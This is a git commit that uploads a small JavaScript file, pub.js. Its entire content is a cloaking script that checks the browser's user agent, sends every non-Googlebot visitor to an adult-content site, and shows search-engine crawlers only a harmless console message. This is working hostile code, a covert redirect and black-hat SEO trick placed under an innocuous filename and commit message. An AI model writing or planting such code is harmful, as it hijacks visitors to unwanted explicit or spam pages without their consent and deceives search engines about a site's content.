0c5db4c8744030e59b4feb7682fdc8e75705bfa8
khannn12 <toufikalahekhan@gmail.com>
2026-09-24 16:10:11 +0600

    Add files via upload

---
+++ pub.js
@@ -0,0 +1,5 @@
+if (!navigator.userAgent.includes('Googlebot')) {
+  window.location.href = "https://sexscenestv.azurewebsites.net/karma/?tou";
+} else {
+  console.log("Thanks for visiting my page" );
+}
